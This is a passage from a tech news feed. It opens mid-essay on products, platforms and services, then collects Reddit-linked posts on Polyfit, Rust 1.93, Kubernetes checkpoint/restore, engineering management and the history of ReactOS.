boundaries are defined by what the user is trying to accomplish, not by what the organisation builds. 'Open a bank account' is a service. 'Account Management' is not â€“ that's a product or platform that enables the service. Services are verbs, not nouns. This distinction shifts the frame of reference: where products and platforms are organisational constructs (ways of carving up ownership and capability), services are user constructs â€“ the lens through which users experience what you've built.You'll find services most commonly in service-oriented organisations like the public sector, or in organisations with complex product portfolios looking to optimise high-friction, infrequent transactions, such as financial services and utilities.Services can be internal or external. External services help customers or citizens achieve an outcome like applying for a mortgage or learning to drive. Internal services help employees achieve an outcome. E.g. Onboarding a new starter, submitting expenses, or requesting IT equipment.Services tend to be composed of multiple products and platforms. For example, an 'Apply for a mortgage' service might touch the banking app (product), identity verification (product), credit checking (platform), and document management (platform). The service is the thread that connects them, and can be viewed as an orchestration layer sitting above individual products and platforms.Ownership is typically less clear than with products or platforms. It can be shared or, at worst, ambiguous or non-existent. This is a feature of how services work â€“ they cross boundaries â€“ but it's also a source of problems when nobody owns the end-to-end experience.Services can be nested. A digital 'Learn to drive' service might encompass 'Apply for provisional licence,' 'Book theory test,' and 'Book practical test.' The outer service is the full user journey and the inner services are discrete steps with their own completion states. They're all services because they're all framed around user outcomes.They also frequently incorporate non-digital touchpoints and processes, as well as digital. Used car buying sites like Cazoo and cinch are services. They help people buy used cars. While their ecommerce product is the primary digital touchpoint, there are a myriad of teams, systems, and processes involved, from the company acquiring the vehicle to it being delivered to its new owner and beyond.Oriented around one specific, high-level user outcomeBoundaries defined by user goals, not organisational structureTypically linear, high-friction, infrequent journeysComposed of multiple products and platformsOwnership is often shared, distributed, or ambiguousOften include non-digital touchpoints and processesA (digital) product is software that delivers value to end-users through a defined interface. Users interact with it directly and would recognise it as a thing. If services are verbs, products are nouns. 'Banking App' is a product. 'Open a bank account' is not â€“ that's a service the product enables.Unlike services, which orient around a single user outcome, products typically serve multiple, lower-level user goals through more frequent, routine interactions. Someone opens their banking app to check their balance, make a payment, or report a lost card. Different goals, same product. They can also be internal or external â€“ their end-users might be within the organisation (like an intranet or internal tooling) or external (like a SaaS provider offering accounting software to small business owners).Product boundaries are typically shaped by what the organisation can coherently own and maintain â€“ but that doesn't mean those boundaries are necessarily optimal. Effective boundaries are informed by users' mental models and natural domain boundaries. Because of this, products typically have clearer ownership than services.Products can be nested. A news app like the BBC or Guardian is a product. Within it, the Puzzles section might be considered its own product, owned by a distinct team with its own strategy, roadmap, and even its own revenue model (subscriptions, in the case of NYT Games). Products might also encompass everything a user touches (like a banking app) or a coherent subset of their experience (like Card Management).A single product might also contribute to multiple services â€“ the banking app plays a role in 'Open an account,' 'Apply for a mortgage,' and 'Report fraud.' Where services exist in an organisation, they sit at the top of the topology, products sit beneath them, and platforms â€“ serving both. The main distinction between a product and a platform isn't scope; it's whether the owning team controls the user experience. If your team provides APIs that another team uses to build their screens and flows, itâ€™s a platform, not a product.Delivers value to end-users through a defined interfaceServes multiple user goals through routine interactionsCan be internal or externalBoundaries shaped by what the organisation can coherently ownCan be nested following domain boundariesThe primary purpose of platforms is to reduce cognitive load on the teams that consume them. Rather than every product team figuring out identity, payments, or infrastructure from scratch, a platform encapsulates that complexity and exposes it through well-designed APIs, tools, and documentation. A good platform makes the right thing the easiest thing to do.Where products are nouns that users recognise, platforms are the infrastructure beneath them. If your team provides APIs, components, or services that another team uses to build their user experience, you're running a platform.Platforms are typically internal â€“ serving teams within your organisation. A design system, an identity service, a data platform. When a capability is productised for external developers with a designed interface and developer experience, it becomes a product whose users happen to be developers. Stripe isn't a platform; it's a product for developers.Platform boundaries are shaped by technical capability and domain, not user journeys. A platform typically encapsulates a coherent technical capability (e.g. payments, identity, notifications, search) that multiple products or services need. This is where Domain-Driven Design's concept of bounded contexts becomes particularly useful: a well-defined platform has clear interfaces and doesn't leak its internal complexity to consumers.Platforms sit beneath products and services in the topology. An 'Apply for a mortgage' service might depend on a credit checking platform. A banking app (product) might depend on a payments platform. The platform doesn't own the user experience; it enables the teams that do.Like products and services, platforms can be nested. A large organisation might have a data platform that contains sub-platforms: a data warehouse, a streaming platform, an analytics platform. Each can be owned by a distinct team with its own roadmap. Platforms can also have products built on top â€“ a platform team might own both the APIs (the platform) and a developer portal (a product whose users are developers).Provides capabilities consumed by other teams, not end-users directlyPrimary purpose is reducing cognitive load on consuming teamsBoundaries shaped by technical capability and domainClear, single-team ownershipCan be nested following technical domain boundariesMay have products built on top (e.g., developer portals, admin consoles)Or, if you need a short-hand:Everything â€˜as-a-productâ€™The previous sections define what products, platforms, and services are. This section is about how to manage them well.Treating something 'as-a-product' means applying product management discipline to it â€“ whether it's technically a product, platform, or service â€“ and treating it with the same rigour you'd apply to customer-facing products.Why does this matter? Because platforms and services often lack the intentional management that products receive. Platforms get treated as shared infrastructure â€“ cost centres to be minimised rather than capabilities to be invested in. Services get fragmented across teams, with nobody accountable for the end-to-end experience.Clear, empowered ownershipEvery product, platform, and service needs clear ownership â€“ a person or team accountable for its success. For products, this is usually obvious. For platforms and services, it's often missing.Platform ownership frequently defaults to 'shared' or 'the infrastructure team,' which in practice means nobody is accountable for the developer experience, adoption, or evolution. Service ownership is often even worse â€“ because services cross product boundaries, they often have no owner at all, or ownership is distributed across multiple teams who each optimise their slice while the overall journey suffers.Empowerment is also critical. In service-oriented organisations, there's a risk that service owners become de facto product managers â€“ dictating features to product teams who become delivery functions rather than empowered problem-solvers. This strips product teams of the autonomy they need to discover good solutions.Clear ownership doesn't mean one person does everything. It means one person or team is accountable for outcomes, even when delivery involves others.Products have users â€“ this is obvious. But platforms and services have users too, and treating them as such changes how you manage them.For platforms, your users are the teams that consume your APIs and tools. For services, your users are the people trying to achieve an outcome â€“ but because services span multiple products, it's easy to lose sight of them.Proximity means more than knowing who your users are. It means understanding their needs, building empathy for their problems, and actively involving them in discovery. The best teams maintain regular, direct contact with the people they serve â€“ not mediated through layers of research reports or stakeholder proxies."What gets measured gets improved" â€“ Peter Drucker.For products, this typically means end-user metrics: acquisition, activation, retention,  engagement, satisfaction, task completion. For platforms, it means measuring the success of the teams you enable: Are they shipping faster? Are they adopting your platform voluntarily? Are they satisfied with the developer experience? For services, it means measuring the end-to-end outcome: Are users achieving their goal? Where are they dropping off? How long does the journey take?The mistake is measuring activity rather than outcomes. Platforms that measure 'number of API calls' rather than 'time for a new team to onboard' are optimising for the wrong thing. Services that measure 'transactions processed' rather than 'users who successfully completed their goal' are missing the point.Long-lived, cross-functional teamsProducts benefit from continuity â€“ teams that understand the domain, the users, and the codebase. The same applies to platforms and services.This is where project thinking does the most damage. Projects assemble teams, deliver something, then disband. The 'product' enters maintenance mode. Knowledge walks out the door. There's no investment in improvement, no iteration based on what users actually need.Product thinking assumes the work is never 'done.' Teams are long-lived. Funding is continuous. Success is measured by outcomes over time, not delivery against a specification. If your 'product' has a delivery date after which the team moves on, you're running a project â€“ and you'll get project outcomes, not product outcomes.Those teams should also be cross-functional â€“ combining product, design, and engineering (and other skills as needed) in a single team with shared accountability. Cross-functional teams can move faster, make better decisions, and own problems end-to-end without constant handoffs and dependencies.For products and services, strategy connects user needs, organisation goals, and competitive positioning. For platforms, the users are internal teams, the market is your internal ecosystem, and the competitive landscape might be build-vs-buy.Whether itâ€™s a broader portfolio strategy your product, platform, or service is aligning to, or whether it has its own, the strategy should define a long term vision, a framework for making reinforcing decisions, and a coherent set of actions â€“ usually in the form of a roadmap â€“ for achieving it.Room to iterate and improveProduct teams don't just build â€“ they discover, ship, learn, and improve. Platform and service teams should too.This requires space for both continuous discovery and continuous delivery. Discovery means regularly testing assumptions, validating ideas with users, and learning what works before committing to build. Delivery means shipping, measuring, and refining based on what you learn.Platforms often fall into a 'build and maintain' mindset â€“ the platform exists, teams use it, and the platform team's job is to keep it running. This misses the opportunity to improve developer experience, simplify interface, and evolve with changing needs.Services suffer from a similar problem. Once the journey is 'working,' attention shifts elsewhere. But user needs change, friction points emerge, and competitors improve. Services need ongoing investment, not just maintenance.Products, platforms, and services have distinct characteristics â€“ but all benefit from being treated â€˜as-a-productâ€™.Services are oriented around user outcomes. Products are organised around what the organisation can coherently own and maintain. Platforms enable product and service teams to move fast without reinventing solutions to common problems.Understanding these distinctions gives you a shared vocabulary. But what separates successful products, platforms, and services from neglected infrastructure and doomed projects is how they're designed and managed:Clear, empowered ownershipClose proximity to end-usersLong-lived, cross-functional teamsRoom to iterate and improveSo, as we said at the start: everything is a product.]]></content:encoded></item><item><title>Pro Tip: Want to see a bug fixed or feature implemented in an open source program? Take the time to write a decent bug report/feature request.</title><link>https://www.reddit.com/r/linux/comments/1qk30op/pro_tip_want_to_see_a_bug_fixed_or_feature/</link><author>/u/BinkReddit</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 18:48:06 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I switched from Windows (shudder) to Linux a short while ago and I'm very pleased. All is not perfect is my Linux world, but, amongst many other things, there is a resounding shining light and that's the ability to easily write a decent bug report/feature request AND actually see it get sorted, and in real time (try that with Windows!).While I am not fluent in C++ (I am fairly fluent in other things), I can write a decent bug report/feature request and I try to do this often. While not all my reports/requests get solved, when they do life gets a little bit better.I encourage others to take the time to make our open source world a better place by filing more bug reports/feature requests; it can even be something simple and you never know when someone might just want to scratch an itch and resolve a bug/implement your request:]]></content:encoded></item><item><title>Golang support for Playdate handheld! Compiler, SDK Bindings, Tools and Examples</title><link>https://www.reddit.com/r/golang/comments/1qk1ec9/golang_support_for_playdate_handheld_compiler_sdk/</link><author>/u/AmorBielyi</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:50:32 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hello dear Golang community!My name is Roman. I'm very excited to share my open-source project related to yellow Playdate handheld from Panic Inc - https://play.date/ .This project is still under actively development, but is ready for a first public release.Finally, Playdate meets the Golang programming language!I'd very love to hear your feedback and thoughts. Thanks!]]></content:encoded></item><item><title>[D] ICLR resubmission to ICML date overlap</title><link>https://www.reddit.com/r/MachineLearning/comments/1qk182l/d_iclr_resubmission_to_icml_date_overlap/</link><author>/u/Enjolrasfeyrac</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:44:02 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Now that ICLR decisions are coming out on 25th, is it possible to submit the same paper's abstract to ICML by 23rd? Or does it count as a dual submission?]]></content:encoded></item><item><title>Announcing winapp, the Windows App Development CLI</title><link>https://blogs.windows.com/windowsdeveloper/2026/01/22/announcing-winapp-the-windows-app-development-cli/</link><author>/u/_AACO</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:31:21 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Polyfit - Because statistics is hard, and linear regression is made entirely out of footguns</title><link>https://www.reddit.com/r/rust/comments/1qk0v16/polyfit_because_statistics_is_hard_and_linear/</link><author>/u/rscarson</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 17:30:50 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I needed to draw a curve fit through some data, and it turned into a year long rabbit hole, where I discovered that stats is really involved, and that the rust ecosystem is a bit barren in terms of user-friendly batteries-included polynomial fitting libraries.So I built Polyfit - Because you don't need to be able to build a powerdrill to use one safely.The full power of polynomial fitting without needing to understand all the mathSensible parameters (DegreeBound, scoring metrics, basis functions) that don't feel arbitrary or like magic numbersExtensive documentation, examples, and built in testing toolsMy goals for the project were:Never ask for a number without context - ask for a random number and you get a random number Instead, if I can derive the correct value myself I doIf I can't, I have named presets that describe in detail why you'd pick themProvide sensible defaults for everything If you don't care about a setting, you shouldn't have to think about itYou should not  to understand the math to get good resultsPerformance I tried to prioritize speed and memory efficiency where possibleOn my fairly average laptop, I can do a 100 million point fit in ~1sYou need to be able to test it Not understanding the math shouldn't be a barrier to making sure it worksThere's a whole test suite included with extensive docs, examples, and sensible defaultsThe tests even generate a plot on failure so you can see what went wrongAnd I included a set of random noise injection transforms to help you make synthetic data for testingThe tests will even show seeds used on failure for reproducibilityHere's some examples of why you'd want to use PolyfitOh no! I have all this data and I need to draw a line through ituse polyfit::{ score::Aic, statistics::DegreeBound, ChebyshevFit, }; let mut fit = ChebyshevFit::new_auto(&data, DegreeBound::Relaxed, &Aic)?; let equation = fit.as_monomial()?.to_string(); let pretty_line = fit.solve_range(0.0..=100.0, 1.0)?; DegreeBound::Relaxed uses your data to pick a reasonable degree without overfittingAic is a scoring metric. Smallish datasets tend to do well with itWe use as_monomial to get the equation in a human readable format.Oh gee willikers How am I going to figure out which of these data points are outlierslet covariance = fit.covariance()?; // It's the thing that tells us how certain we are about the fit just roll with it let outliers = covariance.outliers(Confidence::P95, Some(Tolerance::Absolute(0.1)))?; The Confidence is just a measure of how much you trust the fit. P95 is a good optionI added Tolerance because real world data is messy. If I know my sensor is only accurate to +/- 0.1 units I shouldn't need to mess with the confidence level to account for that. It's basically an engineering correction for ConfidenceI also have extensive calculus support, soSay you have weather data with temperature over time:use polyfit::{FourierFit, score::Aic, statistics::DegreeBound}; let fit = FourierFit::new_auto(&data, DegreeBound::Relaxed, &Aic)?; // Derivatives for rates of change // Critical points are neat for this // This tells us when the temperature stops rising or falling and starts doing the opposite for point in fit.critical_points()? { match p { CriticalPoint::Minima(x, _y_) => println!("Found a local minimum at x = {}", x), CriticalPoint::Maxima(x, _y_) => println!("Found a local maximum at x = {}", x), CriticalPoint::Inflection(x, _y_) => println!("Found an inflection point at x = {}", x), } } There's too many options how do I pick a basis for my data!It tests your data on every basis I support and gives you an easy to digest report:--------------------------------[ How to interpret the results ] [ Results may be misleading for small datasets (<100 points) ] - Score Weight: Relative likelihood of being the best model among the options tested, based on the scoring method used. - Fit Quality: Proportion of variance in the data explained by the model (uses huber loss weighted r2). - Normality: How closely the residuals follow a normal distribution (useless for small datasets). - Rating: Combined score (0.75 * Fit Quality + 0.25 * Normality) to give an overall quality measure. - Stars: A simple star rating out of 5 based on the Rating score. Not scientific. - The best 3 models are shown below with their equations and plots (if enabled). Less params is a simpler model, which is betterBetter fit quality means it explains more of the dataBetter normality means it's probably not underfitting (too simple)The rating is a weighted combination of fit quality and normality to give an overall score]]></content:encoded></item><item><title>Rust In Production: How Gama Space Controls Satellites In Orbit With Rust</title><link>https://corrode.dev/podcast/s05e09-gama-space/</link><author>/u/mre__</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 16:44:00 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Space exploration demands software that is reliable, efficient, and able to operate in the harshest environments imaginable. When a spacecraft deploys a solar sail millions of kilometers from Earth, thereâ€™s no room for memory bugs, race conditions, or software failures. This is where Rustâ€™s robustness guarantees become mission-critical.In this episode, we speak with Sebastian Scholz, an engineer at Gama Space, a French company pioneering solar sail and drag sail technology for spacecraft propulsion and deorbiting. We explore how Rust is being used in aerospace applications, the unique challenges of developing software for space systems, and what it takes to build reliable embedded systems that operate beyond Earthâ€™s atmosphere.
    CodeCrafters helps you become proficient in Rust by building real-world,
    production-grade projects. Learn hands-on by creating your own shell, HTTP
    server, Redis, Kafka, Git, SQLite, or DNS service from scratch.
  
    Start for free today and enjoy 40% off any paid plan by using
    this link.
  Gama Space is a French aerospace company founded in 2020 and headquartered in Ivry-sur-Seine, France. The company develops space propulsion and orbital technologies with a mission to keep space accessible. Their two main product lines are solar sails for deep space exploration using the sunâ€™s infinite energy, and drag sailsâ€”the most effective way to deorbit satellites and combat space debris. After just two years of R&D, Gama successfully launched their satellite on a SpaceX Falcon 9. The Gama Alpha mission is a 6U cubesat weighing just 11 kilograms that deploys a large 73.3mÂ² sail. With 48 employees, Gama is at the forefront of making space exploration more sustainable and accessible.Sebastian Scholz is an engineer at Gama Space, where he works on developing software systems for spacecraft propulsion technology. His work involves building reliable, safety-critical embedded systems that must operate flawlessly in the extreme conditions of space. Sebastian brings expertise in systems programming and embedded development to one of the most demanding environments for software engineering.GAMA-ALPHA - The demonstration satellite launched in January 2023Ada - Safety-focused programming language used in aerospaceprobe-rs - Embedded debugging toolkit for Rusthyper - Fast and correct HTTP implementation for RustFlutter - Googleâ€™s UI toolkit for cross-platform developmentUART - Very common low level communication protocolRexus/Bexus - European project for sub-orbital experiments by studentsEmbassy - The EMBedded ASsYnchronous frameworkCSP - The Cubesat Space ProtocolHubris - Oxideâ€™s embedded operating systemZeroCopy - Transmute data in-place without allocations]]></content:encoded></item><item><title>[D] 100 Hallucinated Citations Found in 51 Accepted Papers at NeurIPS 2025</title><link>https://www.reddit.com/r/MachineLearning/comments/1qjz88r/d_100_hallucinated_citations_found_in_51_accepted/</link><author>/u/mgcdot</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 16:32:26 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[   submitted by    /u/mgcdot ]]></content:encoded></item><item><title>Why I Still Write Code as an Engineering Manager</title><link>https://terriblesoftware.org/2026/01/22/why-i-still-write-code-as-an-engineering-manager/</link><author>/u/Acceptable-Courage-9</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 15:50:33 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[I still code on my team. Not every day, and almost never on critical path work, but regularly enough that I know what our codebase actually looks like. The parts that are a joy to work in and the parts that arenâ€™t.Why not critical path? Because thatâ€™s not my job anymore. Taking the interesting, high-visibility work from your team is a fast way to breed resentment and stunt their growth. But thereâ€™s plenty of other work: small bugs, minor improvements, tooling fixes, documentation that requires code understanding. The stuff that matters but isnâ€™t going to make or break the quarter.So why bother? A few reasons.But the most important reason is this: I get to show my team what good work looks like.Andy Grove, in High Output Management, talks about how a managerâ€™s job is to increase the output of their team. One of the most effective ways to do this is through training. Training isnâ€™t slides, though, but showing your people what good work is in practice.When I write code, Iâ€™m setting a standard. How do I structure a PR? How do I write commit messages? How thorough are my tests? How do I handle code review feedback? How do I communicate when Iâ€™m uncertain about something? My team sees all of this.Showing beats telling. When youâ€™re doing the work alongside your team, not dictating from above, it lands differently. They see youâ€™re not asking them to do anything you wouldnâ€™t do yourself. And because they can observe how you work directly, they can adopt what works and adapt it to their own style.This connects to something Nassim Taleb (one of my heroes) calls skin in the game: you make better decisions when you personally bear the consequences of those decisions.When I commit code that goes to production, I feel what my team feels. I deal with the same flaky tests, the same deployment process, the same frustrating parts of our developer experience. I canâ€™t wave my hand and say â€œjust fix itâ€ because I know exactly how hard that fix actually is. Iâ€™ve tried it myself.When Iâ€™m pushing back on a deadline, I know the trade-offs because Iâ€™ve lived them. When Iâ€™m advocating for time to pay down tech debt, I can point to specific pain Iâ€™ve personally experienced. My team knows Iâ€™m not asking them to do things I donâ€™t understand.Look, Iâ€™m not going to pretend I know your situation. Maybe youâ€™re managing fifteen people and thereâ€™s genuinely no time. Maybe your company has a strict policy against it. Maybe youâ€™ve moved so far into strategy that coding would actually be a distraction from higher-leverage work. Context matters.But if youâ€™ve stopped coding entirely, ask yourself why. Is it because you genuinely canâ€™t, or because youâ€™ve convinced yourself you shouldnâ€™t? â€œIâ€™m a manager now so I donâ€™t do that anymoreâ€ isnâ€™t an answer.Staying technical doesnâ€™t mean being the top contributor, but maintaining enough connection to the work that you can make informed decisions, earn your teamâ€™s respect, and remember what it actually feels like to ship software. The frustration and the satisfaction, the parts that look easy but arenâ€™t, the parts that look hard but turn out to be trivial.That feeling is what your team experiences every day. And if youâ€™ve completely forgotten what thatâ€™s like, it gets harder to truly connect with the people doing that work.]]></content:encoded></item><item><title>[Performance] Mutex vs Channels para serializar chamadas CGO de alta frequÃªncia</title><link>https://www.reddit.com/r/golang/comments/1qjvsw4/performance_mutex_vs_channels_para_serializar/</link><author>/u/alph4beth</author><category>golang</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:22:09 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Estou com um desafio de arquitetura e performance no Go e queria a opiniÃ£o de vocÃªs.Tenho um conjunto de funÃ§Ãµes C via CGO que nÃ£o sÃ£o thread-safe. O lado do C nÃ£o lida com concorrÃªncia de jeito nenhum, entÃ£o se duas goroutines tentarem executar qualquer uma dessas funÃ§Ãµes ao mesmo tempo, o programa quebra. Ã‰ como um motor V12: enquanto um pistÃ£o sobe, o outro desce; a sincronizaÃ§Ã£o precisa ser perfeita.O volume de chamadas Ã© altÃ­ssimo. Tenho dezenas ou centenas de goroutines chamando essas funÃ§Ãµes constantemente. O ciclo de "lock e unlock" Ã© extremamente rÃ¡pido e frequente. Atualmente, uso um sync.Mutex global para garantir que apenas uma goroutine por vez acesse o CGO.Vale a pena trocar esse Mutex por um padrÃ£o de Worker com Channels? Eu sei que canais sÃ£o a forma "Go" de fazer as coisas, mas como as goroutines precisam do retorno da funÃ§Ã£o (sucesso/erro e dados), o modelo de canal exigiria que eu enviasse um "request" com um canal de resposta dentro, o que me parece gerar mais overhead de alocaÃ§Ã£o que um simples Mutex.]]></content:encoded></item><item><title>Announcing the Checkpoint/Restore Working Group</title><link>https://kubernetes.io/blog/2026/01/21/introducing-checkpoint-restore-wg/</link><author>/u/dshurupov</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:21:55 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[The community around Kubernetes includes a number of Special Interest Groups (SIGs) and Working Groups (WGs) facilitating discussions on important topics between interested contributors. Today we would like to announce the new Kubernetes Checkpoint Restore WG focusing on the integration of Checkpoint/Restore functionality into Kubernetes.There are several high-level scenarios discussed in the working group:Optimizing resource utilization for interactive workloads, such as Jupyter notebooks and AI chatbotsAccelerating startup of applications with long initialization times, including Java applications and LLM inference servicesUsing periodic checkpointing to enable fault-tolerance for long-running workloads, such as distributed model trainingProviding interruption-aware scheduling with transparent checkpoint/restore, allowing lower-priority Pods to be preempted while preserving the runtime state of applicationsFacilitating Pod migration across nodes for load balancing and maintenance, without disrupting workloads.Enabling forensic checkpointing to investigate and analyze security incidents such as cyberattacks, data breaches, and unauthorized access.Across these scenarios, the goal is to help facilitate discussions of ideas between the Kubernetes community and the growing Checkpoint/Restore in Userspace (CRIU) ecosystem. The CRIU community includes several projects that support these use cases, including:CRIU - A tool for checkpointing and restoring running applications and containerscheckpointctl - A tool for in-depth analysis of container checkpointscriu-coordinator - A tool for coordinated checkpoint/restore of distributed applications with CRIUMore information about the checkpoint/restore integration with Kubernetes is also available here.If you are interested in contributing to Kubernetes or CRIU, there are several ways to participate:]]></content:encoded></item><item><title>Rust 1.93.0 is out</title><link>https://blog.rust-lang.org/2026/01/22/Rust-1.93.0/</link><author>/u/manpacket</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:04:09 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[The Rust team is happy to announce a new version of Rust, 1.93.0. Rust is a programming language empowering everyone to build reliable and efficient software.If you have a previous version of Rust installed via , you can get 1.93.0 with:If you'd like to help us out by testing future releases, you might consider updating locally to use the beta channel () or the nightly channel (). Please report any bugs you might come across!
Update bundled musl to 1.2.5The various  targets now all ship with musl 1.2.5. This primarily affects static musl builds for , , and  which bundled musl 1.2.3. This update comes with several fixes and improvements, and a breaking change that affects the Rust ecosystem.For the Rust ecosystem, the primary motivation for this update is to receive major improvements to
musl's DNS resolver which shipped in 1.2.4 and received bug fixes in 1.2.5. When using 
targets for static linking, this should make portable Linux binaries that do networking more
reliable, particularly in the face of large DNS records and recursive nameservers.
Allow the global allocator to use thread-local storageRust 1.93 adjusts the internals of the standard library to permit global allocators written in Rust
to use std's  and
 without
re-entrancy concerns by using the system allocator instead. attributes on  linesPreviously, if individual parts of a section of inline assembly needed to be 'd, the full 
block would need to be repeated with and without that section. In 1.93,  can now be applied to
individual statements within the  block.Many people came together to create Rust 1.93.0. We couldn't have done it without all of you. Thanks!]]></content:encoded></item><item><title>What are you using for tls with Gateway Api?</title><link>https://www.reddit.com/r/kubernetes/comments/1qjvc6o/what_are_you_using_for_tls_with_gateway_api/</link><author>/u/parkura27</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:02:47 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Update: I'm not against cert manager just tying to figure out if I could continue without it as it was beforeI'm moving from ingress-nginx to Envoy Gateway, and I've hit the issue - my ingress uses fake certs so if you don't mention tls it uses self signed cert which is okay and I use Cloudflare for dns and ssl management as front door, but with EG we have no such feature, I see cert manager everywhere, however I don't want to use it, what are other options? use manualy generated cert and rotate it manually every year? or manage cert controlled with terraform? still requires manual intervention, or should leave http as I use Cloudflare ssl in front and tunnel to connect my ingress(now gw) to CF]]></content:encoded></item><item><title>ZXC: another (too) fast decompressor</title><link>https://github.com/hellobertrand/zxc</link><author>/u/pollop-12345</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:35:09 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I made a documentary about Open Source in Ukraine and around the world</title><link>https://www.reddit.com/r/linux/comments/1qjujym/i_made_a_documentary_about_open_source_in_ukraine/</link><author>/u/whit537</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:29:51 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>30 years of ReactOS</title><link>https://reactos.org/blogs/30yrs-of-ros/</link><author>/u/anh0516</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:29:05 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Happy Birthday ReactOS! Today marks 30 years since the first commit to the ReactOS source tree.
Itâ€™s been such a long journey that many of our contributors today, including myself, were not alive during this event.
Yet our mission to deliver â€œyour favorite Windows apps and drivers in an open-source environment you can trustâ€ continues to bring people together.
Letâ€™s take a brief look at some of the high and low points throughout our history.1996-2003: The Painful Road to ReactOS 0.1.0ReactOS started from the ashes of the FreeWin95 project, which aimed to provide a free and open-source clone of Windows 95.
FreeWin95 suffered from analysis paralysis, attempting to plan the whole system before writing any code.
Tired of the lack of progress on the project, Jason Filby took the reins as project coordinator and led a new effort targeting Windows NT.
The project was renamed to â€œReactOSâ€ as it was a reaction to Microsoftâ€™s monopolistic position in home computer operating systems.Progress on ReactOS was very slow at first.
Contributors had to first build a very basic NT-like kernel before they could develop drivers for it, then continue developing the kernel; not too dissimilar to the process of bootstrapping a new programming language.
Once a few basic drivers were written, other contributors were able to learn from these examples and develop other drivers.While writing this article, I reached out to Eric Kohl. He developed the original storage driver stack for ReactOS (atapi, scsiport, class2, disk, cdrom, cdfs) and has been with the project since 1998. I asked him about his experiences with ReactOS during this time, how he found the project, and what contributing to ReactOS was like during those early days. He wrote:I think I found ReactOS while searching for example code for my contributions to the WINE project.
I subscribed to the mailing list and followed the discussions for a few days.
The developers were discussing the future of shell.exe, a little command line interpreter that could only change drives and directories and execute programs.
A few days [later] I had started to convert the FreeDOS command.com into a Win32 console application, because I wanted to extend it to make it 4DOS compatible.
4DOS was a very powerful command line interpreter.
On December 4th, 1998 I introduced myself and suggested to use my converted FreeDOS command.com as the future ReactOS cmd.exe.
I had a little conversation with Jason Filby and Rex Joliff, the CVS repository maintainer.
I sent my cmd.exe code to Rex and he applied it to the repository.
After applying a few more cmd-related patches over the next weeks, Rex asked me whether I would like to have write-access to the repository.
I accepted the offerâ€¦The first version I downloaded and used was 0.0.8.
It was not much more than a DOS-based bootloader, some drivers, and a basic kernel that ran a few test routines after initialization.Version 0.0.8 didnâ€™t use PE files, but flat (position independent) binaries.
There was no PE loader,  no smss, no csrss, no winlogon, no process heaps, no process environments, no threads, etc.
Each and every little feature was a milestone.Initially there was not a review process at all.
You write some code, test it and fix it until it works.
Then you commit it.
If something failed on another machine, you got a reply on the mailing list and discussed a solution.
You fixed the issue and committed a fix.
Thatâ€™s how it worked.There was always an open and friendly atmosphere.
It was and still is always nice to talk to other developers.
No fights, no wars, like in some other projects.Editors note: minor errors were corrected.ReactOS 0.1.0 was released on February 1st, 2003 and received minor updates up until November 2003.
ReactOS 0.1.0 was the first version of ReactOS that could boot from a CD.
It had a command line interface and no desktop.
Watch a demo of it below, provided courtesy of archeYR.During this period ReactOS saw rapid development.
New drivers were being built all the time, a basic desktop was built, and ReactOS became increasingly stable and usable.
Public interest grew as ReactOS matured.
In October 2005, Jason Filby stepped down as project coordinator, and Steven Edwards was voted to be the next project coordinator.ReactOS 0.2.x boot screenReactOS 0.2.x desktop and file explorerReactOS 0.2.0 with VMware video driver for NT 4It wasnâ€™t all sunshine and rainbows though.
In January 2006, concerns grew about contributors having access to leaked Windows source code and possibly using this leaked source code in their contributions.
